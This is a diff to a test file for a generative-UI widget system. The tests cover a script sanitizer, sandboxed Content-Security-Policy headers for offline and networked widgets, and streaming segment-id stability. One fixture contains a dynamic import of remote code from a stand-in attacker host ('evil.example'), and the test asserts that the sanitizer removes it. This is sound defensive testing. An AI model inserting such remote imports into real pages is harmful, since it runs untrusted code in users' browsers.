@@ -1,7 +1,10 @@
 import { describe, expect, test } from "bun:test";
+import { readFileSync } from "fs";
+import path from "path";
 import {
   parseGenerativeUiDsl,
   splitGenerativeUiSegments,
+  withGenerativeUiSegmentIds,
   hasWidgetBody,
 } from "../web/src/indirect-code/components/generative-ui/dsl";
 import { processPartialHtml } from "../web/src/indirect-code/components/generative-ui/process-partial-html";
@@ -16,6 +19,7 @@ import {
   escapeStyleClose,
   sanitizeModelJS,
   widgetCSP,
+  widgetNetCSP,
   buildRuntimeScript,
   buildModelScript,
   buildWidgetDocument,
@@ -210,6 +214,19 @@ describe("widget document sanitizers", () => {
     }
   });
 
+  test("sanitizeModelJS allows esm.sh dynamic imports only when opted in", () => {
+    const esm = 'import("https://esm.sh/canvas-confetti@1").then((m) => m.default());';
+    const other = 'import("https://evil.example/x.js").then(() => {});';
+    const statik = 'import confetti from "https://esm.sh/canvas-confetti@1";';
+    // Default (offline widget): every import form is stripped.
+    expect(sanitizeModelJS(esm)).not.toContain("esm.sh");
+    // Net widget: only the literal esm.sh dynamic import survives.
+    const clean = sanitizeModelJS([esm, other, statik].join("\n"), { allowEsmSh: true });
+    expect(clean).toContain(esm);
+    expect(clean).not.toContain("evil.example");
+    expect(clean).not.toContain("import confetti");
+  });
+
   test("buildRuntimeScript wraps model js in a try/catch", () => {
     const script = buildRuntimeScript({ stateJSON: '{"a":1}' });
     expect(script).toContain("window.__gu");
@@ -227,16 +244,29 @@ describe("widget document sanitizers", () => {
     expect(script).not.toContain("eval(");
   });
 
-  test("widget CSP is locked down: sandboxed, no network, nonce scripts", () => {
+  test("widget CSP is locked down: sandboxed, images-only network, nonce scripts", () => {
     const csp = widgetCSP("abc");
     expect(csp).toContain("sandbox allow-scripts");
     expect(csp).toContain("default-src 'none'");
     expect(csp).toContain("script-src 'nonce-abc'");
     expect(csp).toContain("connect-src 'none'");
     expect(csp).toContain("frame-ancestors 'self'");
-    // Only styles are inline; scripts are strictly nonce'd.
+    // Images may load from any http(s) site; scripts stay strictly nonce'd.
+    expect(csp).toContain("img-src data: blob: https: http:");
+    expect(csp).not.toContain("esm.sh");
     const scriptSrc = csp.split(";").map((s) => s.trim()).find((s) => s.startsWith("script-src")) || "";
     expect(scriptSrc).not.toContain("unsafe-inline");
+    expect(scriptSrc).not.toContain("unsafe-eval");
+  });
+
+  test("net widget CSP opens https data and esm.sh scripts only", () => {
+    const csp = widgetNetCSP("abc");
+    expect(csp).toContain("img-src data: blob: https: http:");
+    expect(csp).toContain("connect-src https:");
+    expect(csp).toContain("script-src 'nonce-abc' https://esm.sh");
+    const scriptSrc = csp.split(";").map((s) => s.trim()).find((s) => s.startsWith("script-src")) || "";
+    expect(scriptSrc).not.toContain("unsafe-inline");
+    expect(scriptSrc).not.toContain("unsafe-eval");
   });
 
   test("buildWidgetDocument never lets model css/js break out of its element", () => {
@@ -291,5 +321,89 @@ describe("widget design system", () => {
     expect(script).toContain("ResizeObserver");
     expect(script).toContain("MutationObserver");
     expect(script).toContain('setProperty("--p"');
+    // The mutation observer must never watch attributes: slider fill writes
+    // (and per-frame animation styles) would self-trigger it into a loop.
+    expect(script).not.toContain("attributeFilter");
+    expect(script).not.toContain("attributes: true");
+    // Uncaught widget errors are reported to the host error footer.
+    expect(script).toContain("unhandledrejection");
+    expect(script).toContain('addEventListener("error"');
+  });
+});
+
+describe("streaming segment stability (no per-token remount)", () => {
+  const FULL = [
+    "Here is a savings calculator for you.",
+    "",
+    "```generative_ui",
+    "placeholder: Building your savings projection",
+    "@html",
+    '<div class="gu-root"><h2 class="gu-title">Hi</h2></div>',
+    "```",
+    "",
+    "Adjust the slider to explore.",
+  ].join("\n");
+
+  test("segment ids are stable while tokens append", () => {
+    // Simulate token streaming over prefix slices. The reconciled store in
+    // StreamingMarkdown keys by these ids; an id that changes for an
+    // already-mounted segment remounts its TarnavMarkdown/widget instance.
+    const seenKindById = new Map<string, "md" | "widget">();
+    let previousIds: string[] = [];
+    for (let n = 8; n <= FULL.length + 8; n += 8) {
+      const segs = withGenerativeUiSegmentIds(
+        splitGenerativeUiSegments(FULL.slice(0, Math.min(n, FULL.length))),
+      );
+      const ids = segs.map((s) => s.id);
+      // Ids are unique within a step and never change kind once seen.
+      expect(new Set(ids).size).toBe(ids.length);
+      for (const seg of segs) {
+        const before = seenKindById.get(seg.id);
+        if (before !== undefined) expect(seg.kind).toBe(before);
+        seenKindById.set(seg.id, seg.kind);
+      }
+      // Every id present in both steps survives in place (no churn).
+      for (const id of previousIds) {
+        if (seenKindById.has(id) && ids.includes(id)) {
+          expect(ids.indexOf(id)).toBe(previousIds.indexOf(id));
+        }
+      }
+      previousIds = ids;
+    }
+    expect(previousIds).toEqual(["s0:md", "s1:widget", "s2:md"]);
+  });
+
+  test("transcript markdown renders through a reconciled store, memoized parse", () => {
+    const root = path.join(import.meta.dir, "..");
+    const streaming = readFileSync(
+      path.join(root, "web/src/indirect-code/components/StreamingMarkdown.tsx"),
+      "utf8",
+    );
+    // Regression: <For each={segments()}> over freshly split objects
+    // remounted the stateful TarnavMarkdown parser on every token.
+    expect(streaming).toContain("createStore");
+    expect(streaming).toContain("reconcile(");
+    expect(streaming).not.toContain("each={segments()}");
+    // Basic mode (thinking disclosures) never mounts widgets.
+    expect(streaming).toContain("if (props.basic)");
+    const renderer = readFileSync(
+      path.join(root, "web/src/indirect-code/components/generative-ui/renderer.tsx"),
+      "utf8",
+    );
+    expect(renderer).toContain("createMemo<GenerativeUiData>");
+    expect(renderer).not.toContain("const data = (): GenerativeUiData =>");
+    // Centered loading state + error footer that pastes a report (ref +
+    // placeholder + message) into the composer without sending it.
+    expect(renderer).toContain("place-items-center");
+    expect(renderer).toContain("mb-3");
+    expect(renderer).toContain("Ask to fix");
+    expect(renderer).toContain("onPrefillPrompt");
+    expect(streaming).toContain("onPrefillPrompt");
+    const bridge = readFileSync(
+      path.join(root, "web/src/indirect-code/components/generative-ui/bridge.ts"),
+      "utf8",
+    );
+    expect(bridge).toContain('data.__gu !== "error"');
+    expect(bridge).toContain("onError");
   });
 });
